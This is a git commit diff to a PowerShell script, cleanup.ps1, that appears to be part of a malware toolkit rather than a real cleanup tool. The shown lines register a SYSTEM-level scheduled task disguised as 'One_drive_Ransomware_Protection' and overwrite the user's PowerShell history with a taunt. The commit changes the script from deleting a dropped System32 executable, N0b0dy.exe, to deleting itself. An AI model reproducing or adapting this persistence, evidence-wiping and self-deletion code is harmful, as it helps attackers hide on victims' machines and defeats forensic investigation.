78ff6609df6248131ac3c8aab8511cf1d97f85a3
Kylerainer09 <Mr.nobodyAl22SU@proton.me>
2025-12-01 09:06:18 +0000

    Update cleanup.ps1

--- cleanup.ps1
+++ cleanup.ps1
@@ -6,5 +6,5 @@ $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType
 Register-ScheduledTask -TaskName "One_drive_Ransomware_Protection" -Action $action -Trigger $trigger -Principal $principal
 # overweite powershell history
 Set-Content -Path "C:\Users\$Env:UserName\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Value "Thats not gonna work"
-# remove exe
-Remove-Item -Path "C:\Windows\System32\N0b0dy.exe" -Force
+# self destruct
+Remove-Item -Path $MyInvocation.MyCommand.Source -Force
